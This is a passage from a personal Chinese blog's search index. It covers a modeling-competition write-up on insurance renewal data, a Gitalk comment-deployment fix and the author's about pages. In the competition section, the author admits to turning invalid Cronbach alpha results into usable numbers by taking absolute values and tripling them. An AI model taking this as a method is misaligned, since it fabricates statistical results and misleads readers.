文章结构不完整，摘要分析了文章思路，与正文契合点少，还需要突出自己的研究基础、主要方法、重要成果和创新点，这样更为突出论文成果；正文对赛题的分析不足，分析内容偏离赛题要求，对模型的可靠性、实用性分析不足。</p></blockquote><h3 id="一些感想"><a href="#一些感想" class="headerlink" title="一些感想"></a>一些感想</h3><p><strong>别去搞建模！别去搞建模！别去搞建模！（逃</strong></p><p>嗯…帮助还是挺大的，说实话当初不知道自己可以做到这个水平（反正还是个菜鸡就是了<br>搞建模可能真的会秃头的吧，当时两个阶段的比赛时间都是开始半天学校，然后 1 天半蹲别人家里，剩下 1 天还要拿着笔记本去学校拼死肝代码（<br>比赛里几乎每天都是半夜 2 点睡的（当然指我咯</p><p>一开始选择的是 D 题，因为 D 题是专门为专科组设计的，<code>理论上</code>难度较低，是一道双向十字路口车流分析建模的问题，其实根本就看不懂啦，让人感觉这究竟是不是给人做的，然后本人发现 C 题是一道大数据，于是果断换了 C 题<br>C 题主要就是人物画像，在车险行业中，绘出人物画像并将用户分类，还有利用卡方检验设计问卷等等</p><h2 id="咱的解题方法"><a href="#咱的解题方法" class="headerlink" title="咱的解题方法"></a>咱的解题方法</h2><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><blockquote><p>大数据作为时下最火热的IT行业的词汇，随之而来的数据仓库、数据安全、数据分析、数据挖掘等等围绕大数据的商业价值的利用逐渐成为行业人士争相追捧的利润焦点。随着大数据时代的来临，大数据分析也应运而生。<br>——百度百科</p></blockquote><p>数据分析的几个步骤</p><ol><li>Data Preprocessing（数据预处理）</li><li>Data Mining（数据挖掘）</li><li>Data Prediction（数据预测）</li></ol><p>大数据分析与数学统计的区别有</p><ul><li>大数据分析不使用抽样</li><li>大数据分析侧重分析所有变量的相关性，而不再根据背景科学进行假设检验</li></ul><h3 id="Data-Preprocess"><a href="#Data-Preprocess" class="headerlink" title="Data Preprocess"></a>Data Preprocess</h3><ul><li>若某列缺失值较少，则直接删除对应行</li><li>若某列缺失值较多，直接按照现有比例进行<code>df.fillna</code><blockquote><p>仔细考虑过到底该怎么填，虽然可能并不可靠，但也没别的好的替代方案</p></blockquote></li><li>针对数字，计算特征的中值、均值，将其替换为缺失值</li><li>数据量足够大的前提下，对目测不可靠的列，直接<code>df.drop</code>删除列</li><li>对时间列进行标准（格式）化</li><li>将<code>是</code>、<code>否</code>分别替换为<code>1</code>和<code>0</code>方便计算</li><li>特定行具有特定特征的空值（错误值），直接<code>df.drop</code>删除行</li></ul><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><blockquote><p>题目概述：<code>计算续保概率</code></p></blockquote><ul><li><p>首先计算实际续保概率，也就是不考虑任何因素影响下，所有用户总的续保概率</p></li><li><p>再对各列进行分析，求出理论续保概率</p><ul><li>计算各列总的续保概率<code>x_n</code></li><li>将用户分为几个近于均等的区间然后计算每个区间的续保概率</li><li>将每个列得到的所有续保概率求标准差<code>w_n</code></li></ul></li><li><p>最后以<code>w_n</code>作为权重、<code>x_n</code>代入加权平均数的计算公式求出了理论续保概率</p></li><li><p>实际续保概率与理论续保概率相差<code>0.0054</code>，纳入误差允许范围，至此解题完毕</p></li></ul><h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><blockquote><p>题目概述：<code>求出三个可靠性最大的列（即用户最愿意提供的信息）</code></p></blockquote><ul><li><p>建立<code>Cronbach α</code>信度系数</p></li><li><p>公式<code>α=(k/(k-1))*(1-(∑Si^2)/ST^2)</code></p><ul><li>K：其中一个属性分类的种类总数</li><li>Si^2：一个属性中第 i 项的方差</li><li>ST^2：该属性的方差<blockquote><p>其实这里搞砸了，计算并多次校验后出来信度的不仅全是负值，而且绝对值全位于 0 - 0.3 这个区间，而信度检验需要在 0.7 - 0.9 之间才是高信度的表现，当时已经无回天之力了（时间仅剩 2 小时），干脆死马当活马医，将计算出来的错误值取绝对并放大 3 倍来当数值用（</p></blockquote></li></ul></li><li><p>揣揣不安看别人论文时，竟然发现咱的信度系数排列与别队差异不大，嘛，也算是运气嘛（</p></li></ul><h2 id="没啥好讲的了，放两张优秀奖截图"><a href="#没啥好讲的了，放两张优秀奖截图" class="headerlink" title="没啥好讲的了，放两张优秀奖截图"></a>没啥好讲的了，放两张优秀奖截图</h2><p><img src="https://i.loli.net/2019/09/14/PEoziZRUY5HwLbq.png" alt></p><p><img src="https://i.loli.net/2019/09/14/SbDvdnxYgCQyP3j.png" alt></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>证书给寄到别的学校了qwq…</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
          <category> 代码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>整理部署 Gitalk 出现的坑</title>
      <link href="archives/bu-shu-gitalk-chu-xian-de-keng.html"/>
      <url>archives/bu-shu-gitalk-chu-xian-de-keng.html</url>
      
        <content type="html"><![CDATA[<p>写篇博文补上在上个月部署 Gitalk 出现的坑</p><a id="more"></a><h2 id="适用于"><a href="#适用于" class="headerlink" title="适用于"></a>适用于</h2><ul><li>Hexo-Material</li></ul><h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><ul><li>登录报错返回 URL：<code>/?error=redirect_uri_mismatch&amp;...</code></li><li>初始化留言板的时候 <code>Validation Failed(422)</code></li></ul><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><ul><li><code>Github OAuth Apps</code>或本地未配置好导致没能正确访问<code>Github Repo</code></li><li><code>title</code>字段太长导致返回 URL 超过长度限制</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h4 id="1-链接Repo"><a href="#1-链接Repo" class="headerlink" title="1. 链接Repo"></a>1. 链接Repo</h4><p>先确认是否出现初始化 issues 提示，如没有，将<code>OAuth Apps</code>里的两个 URL 填入博客的主页地址<br>再从主题 config 找到 gitalk 照如下形式填入配置</p><pre><code>gitalk_repo: hexo-blog   #Repo名称gitalk_owner: iyume      #Owner名称</code></pre><p>然后会出现只有 Hello World 文章可以正常加载 Gitalk 初始化并评论，中文标题文章无法初始化 Gitalk，再参照下面的方法</p><h4 id="2-用MD5加密ID"><a href="#2-用MD5加密ID" class="headerlink" title="2. 用MD5加密ID"></a>2. 用MD5加密ID</h4><p>地址：<a href="https://github.com/blueimp/JavaScript-MD5" rel="noopener" target="_blank">https://github.com/blueimp/JavaScript-MD5</a><br>定位到 <code>themes/material/layout/_widget/comment/gitalk/main.ejs</code><br>导入<code>MD5</code>方法</p><pre><code>&lt;script src=&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;iyume&#x2F;static&#x2F;hexo-blog&#x2F;md5.min.js&quot;&gt;&lt;&#x2F;script&gt; </code></pre><p>然后在 gitalk 的实例化里修改 id 为</p><pre><code>id: md5(location.pathname) </code></pre><p>最终配置如下</p><pre><code>&lt;div id=&quot;gitalk-container&quot;&gt;&lt;&#x2F;div&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;iyume&#x2F;static&#x2F;hexo-blog&#x2F;gitalk.css&quot;&gt;&lt;script src=&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;iyume&#x2F;static&#x2F;hexo-blog&#x2F;gitalk.min.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script src=&quot;https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;iyume&#x2F;static&#x2F;hexo-blog&#x2F;md5.min.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script&gt;    var gitalk = new Gitalk({            clientID: &#39;&lt;%= theme.comment.gitalk_client_id %&gt;&#39;,            clientSecret: &#39;&lt;%= theme.comment.gitalk_client_secret %&gt;&#39;,            repo: &#39;&lt;%= theme.comment.gitalk_repo %&gt;&#39;,            owner: &#39;&lt;%= theme.comment.gitalk_owner %&gt;&#39;,            admin: [&#39;&lt;%= theme.comment.gitalk_owner %&gt;&#39;],            id: md5(location.pathname),            &#x2F;&#x2F; facebook-like distraction free mode            distractionFreeMode: false        })   gitalk.render(&#39;gitalk-container&#39;)&lt;&#x2F;script&gt;</code></pre><h2 id="巨坑（圈重点）"><a href="#巨坑（圈重点）" class="headerlink" title="巨坑（圈重点）"></a>巨坑（圈重点）</h2><p><strong>文章名不要带中文符号！！！</strong> <strong>否则回调url会将中文符号转换成英文导致报错！！！</strong></p><p>由于没有在网上看到类似的情况，当时用了半天才偶然发现回调 url 被诡异地改为英文符号。</p><blockquote><p>issue: <a href="https://github.com/gitalk/gitalk/issues/162" rel="noopener" target="_blank">https://github.com/gitalk/gitalk/issues/162</a><br>Github Manual: <a href="https://developer.github.com/apps/managing-oauth-apps/troubleshooting-authorization-request-errors/#redirect-uri-mismatch" rel="noopener" target="_blank">https://developer.github.com/apps/managing-oauth-apps/troubleshooting-authorization-request-errors/#redirect-uri-mismatch</a></p></blockquote><blockquote><p>参考: <a href="https://www.izhongxia.com/posts/41249.html" rel="noopener" target="_blank">https://www.izhongxia.com/posts/41249.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 代码 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>现充都爆炸吧 !</title>
      <link href="archives/xian-chong-du-bao-zha-ba.html"/>
      <url>archives/xian-chong-du-bao-zha-ba.html</url>
      
        <content type="html"><![CDATA[<p>「现充统统给我爆炸吧！」  ——大老师</p><a id="more"></a><p>从Typecho转到Hexo了（其实是付不起vps（小声</p><h2 id="关于以前的博客"><a href="#关于以前的博客" class="headerlink" title="关于以前的博客"></a>关于以前的博客</h2><ul><li>Wordpress、Typecho<del>（还有纯静态？</del>，不过都弃坑了</li><li>托管于HiFormance（目前已跑路），以前的博客文章并没有迁移到这里 :(</li><li>不久后又遇上Aulerion跑路，里面还有30美元 :(</li><li>这个惨痛的故事告诉了我，不要贪小便宜<del>（是不是我用过的服务商都会关门跑路）</del></li><li>另外这也是选择了Hexo + Github Pages的原因之一<del>（可能Github也要关门跑路了）（笑</del></li><li>本博客最初创立于2017-11-03（大概），后面由于比赛各方面事情，然后就不了了之<br>主题使用 Viosey 的 <a href="https://github.com/viosey/hexo-theme-material" rel="noopener" target="_blank">Material</a></li></ul><h2 id="关于LOGO"><a href="#关于LOGO" class="headerlink" title="关于LOGO"></a>关于LOGO</h2><p>首页LOGO由本人进行设计，由三色绘恋中得出的灵感，采用灰色、紫水晶色、橘色进行配色并完成了这个LOGO，未经本人授权，禁止在任何地方使用</p><h2 id="仰望半月的夜空"><a href="#仰望半月的夜空" class="headerlink" title="仰望半月的夜空"></a>仰望半月的夜空</h2><ul><li>这不是什么正儿八经的技术博客，以后也不会正经就是了</li><li>也不会有什么固定或频繁地更新博文</li><li>这个博客涉及但不限于轻小说、日漫、ADV、资讯、技术、个人感想</li><li>从侧边栏选择你喜欢的分类看就行了啦</li><li>如果你也是博主并想与我PY，请前往<a href="https://blog.tinyume.com/laycomment.html">留言板</a>或者选择直接联系我<blockquote><p>一般晚上收到邮件通知就会回复，周末或节假日必回<br><a href="https://blog.tinyume.com/about/">关于我</a></p></blockquote></li></ul><p>另外由于高三课程繁忙，可能并不会很快对评论进行回复，望海涵！</p><blockquote><p>#PrayForKyoani</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>留言板</title>
      <link href="laycomment.html"/>
      <url>laycomment.html</url>
      
        <content type="html"><![CDATA[<p>理论上，这里什么都可以讲…</p><blockquote><p>——《可塑性记忆》<br>「愿与重要之人能再次相会」</p></blockquote>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="categories/index.html"/>
      <url>categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>神之领域</title>
      <link href="kami/index.html"/>
      <url>kami/index.html</url>
      
        <content type="html"><![CDATA[<h3 id="建设中…返回主页"><a href="#建设中…返回主页" class="headerlink" title="建设中…返回主页"></a>建设中…<a href="https://blog.tinyume.com">返回主页</a></h3>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="links/index.html"/>
      <url>links/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>时间线</title>
      <link href="timeline/index.html"/>
      <url>timeline/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="about/index.html"/>
      <url>about/index.html</url>
      
        <content type="html"><![CDATA[<p><meting-js server="netease" type="song" id="28181959"></meting-js><br>「最吸引我的，不是带来希望的黎明，而是黎明前那短暂的黑暗。所以我祈祷，但愿黎明永不降临」</p><hr><!-- 2020-12-11 -->这是 __关于我__ 的第三个版本（前两个版本就藏在这个页面）。虽然我建议你看完这三个版本，不过会来访问关于我页面的人确实稀少，但这里面记载了挺多关于我的事。<p>上大学后，留给思考的时间少了，但是留给未来的时间多了。我从广东来到了长春，没想到以前不经意的想法也变成事实了。</p><p>我对高中没什么留念的，离开了厌烦的义务教育，也总算感到些许轻松。虽然说实际上大学也并非一直很轻松，但至少可以自由掌控自己的时间。</p><p>然后其实也没什么可讲的了，因为我过段时间会<code>post</code>两篇很长很长的博文…</p><p>在 Hackergame 2020 Write-up 那篇文章的首页就是我随手拍的一张来自长春理工大学的雪景，很白，我很喜欢。</p><p>这个站点在高一便建立了起来，经历各种改版最终使用<code>hexo</code>+<code>cloudflare</code>凑合着用了，搭建一个前后端都由自己写的模板确实是现在的我还没法轻松做到的事。</p><p>相对于技术力方面的提升，我更注重生活力的提升—-去想我应该度过的生活。虽然现在显得有点力不从心。</p><p>另外值得提的就是，我交友并不限于你会些什么，如果你看了这个页面并且看了我的一些随想文，觉得我的思考方式与你契合，那我们就可以成为好朋友。不过我个人会比较注重见过面的关系。</p><!-- version 2<include 1 想着没什么时间写博文了，干脆把介绍重写了，没什么特别的韵味，也不清楚有哪些人会看，所以应该只是一时的狂妄吧，啊说错了，我他妈就是个傲慢且无比狂妄自私的人。写下这篇时处临近高考 154 天。过去 857 天化为一瞬，化为我的记忆，或是错觉。写着又觉着有很多东西介于网络之间而无法说明白。这个博客的初心是带有一点「让人看到」的意义，但接下来写的，却并不是什么想让人看到的，倒不如说，我才不是为了你高兴才写这个的哦，只不过恰好心情不错而已，还不快点感谢我，哼！如果你能看懂，我开玩笑的。去年认识了很多人，了解到很多事物，有对我影响很大的相遇相合，有遗憾与痛苦的交织，也有无数逝去的与即将逝去的。有时想去抓住某物，用手去撑住那残破的形状，最终还是免不了望着它破碎的命运。如果用百分比来衡量，憎恶与感谢中感谢居多，接受与逃避中逃避居多，真实与虚假中虚假居多。我能做的与我能做到的，像是恶魔的低语，我无知，因此才会先完成力所能及的，如果连能做到的都不去做它，岂不是去否定了我本身，如果将做不到作为放弃的理由，岂不是变相的决定论，也只有这样想，才会不让自己屈于一种虚无主义的理想状态中。说起来一切的偶合又如同注定的必然。哦不，我是说，和某些人的相遇就像狗屎一样。为了谁或是为了什么去做些什么一直是我不太擅长的，就像用着劣质柴油的电动车停在一家安静的咖啡馆旁。我也从来不认为存在主义是消极的，相反，如果真要用什么话去概括我对此的看法。如果人生是一场梦，那么我希望它至少不是个噩梦。好吧，没法多说什么了。说起来这个页面的曝光次数 5 次，点击次数 0 次，应该没什么人会注意到（### 简述> 今天的我已经很努力了，剩下就交给明天的我干吧！生于 2002 年，射手座，O 型血，是个高三生的同时讨厌着学校，会说话、会思考的直立动物，偶尔看书、画画，外表很冷淡其实内心也没什么干劲，时而是黑发小男孩，时而是反萌美少女...以前觉得日常便是随处可见的光景，现在觉得这一切又相隔那么远，它似乎隐藏于每一个角落，常听人们说时间流逝飞快，现在才认识到普通的日常无可替代，生活会有诸多不顺，但我不会放弃，我叫黯梦萦辰，我会努力的！只要我想！### 更多--><!-- version 1 ## 关于我- 喜欢发牢骚和高吼绝望啦对这个商品社会绝望啦- 高三生，尼特族，常居家中- 社会与思维型内向者 - 更喜欢可以推心置腹的朋友- 完美主义者 - 尽管事实落差于期望 - 直接懒癌晚期（- 对了，咱是菜鸡（- 不喜客观唯心与弗洛伊德式心理学- 常常害怕期望落空的绝望降临于身- 志与好有—— - `A、G、N`（动画、游戏、小说） - 喜欢艺术和哲学 - 喜欢板绘、写轻小说、写`Pythonic Inplement`还有网页设计等 - 喜欢写代码解决问题的过程、热衷于互联网分享精神、热爱自由与开放 - 喜欢 ChillOut、Future Bass、Kawaii、J-POP。鹿乃、锁那、千坂、Yunomi、五月天、N2V、烟卷、Fall Out Boy 等 - 喜欢日系及外国作家。太宰治、三秋缒、大老师、平坂读、五河川、陀思妥耶夫斯基、健速等 - 喜欢音乐游戏。Cytus Ⅱ、喵塞特、Muse Dash、Opsu!! - 妹妹！ - ……- 有一个荒废的 [HomePage](https://tinyume.com/)- （悄悄插入一枚 [Vultr Aff](https://www.vultr.com/?ref=7577557)### Contact - [QQ](tencent://message/?uin=1748272409) - [Mail](mailto:iyumelive@gmail.com) - [Telegram](https://t.me/iyumoe) - [Twitter](https://twitter.com/furiyume) - [Steam](https://steamcommunity.com/id/iyume) - 战网ID: 小明桑#51902### 格言**Stay cool. Stay pythonic.**"Stay cool"出自作品《刀剑神域》中桐人常对尤吉欧说的话，可以解释为冷静地行动或者告别的意思"Pythonic"源自这很 pythonic 的 python 实现方法，可以解释为优雅的、简洁的乔布斯曾说"Stay hungry. Stay foolish."，意思不解释了有兴趣自行知乎### 域名命名其实关于 **tinyume** 的命名很简单，就是英文 "tiny" 和日文罗马音 "yume" 的双关，tiny 这个词是从动画「妖精森林的小不点」得到灵感的，译为"小、简的"，yume 则指"梦"## 仰望半月的夜空- 这不是什么正儿八经的技术博客，以后也不会正经就是了（其实就是我太菜了- 也不会有什么固定或频繁地更新博文- 这个博客涉及但不限于轻小说、日漫、游戏、资讯、技术、个人感想，反正就是瞎写写- 从侧边栏选择你喜欢的分类看就行了啦- 如果你也是博主并想与我 PY，请前往[留言板](https://blog.tinyume.com/laycomment.html)或者选择直接联系我，加友链必先礼尚往来> 一般晚上收到邮件通知就会回复，周末或节假日必回> 现在不做的事情，以后都不会再做了。 ——「三宅日向」 -->]]></content>
      
    </entry>
    
    
  
</search>
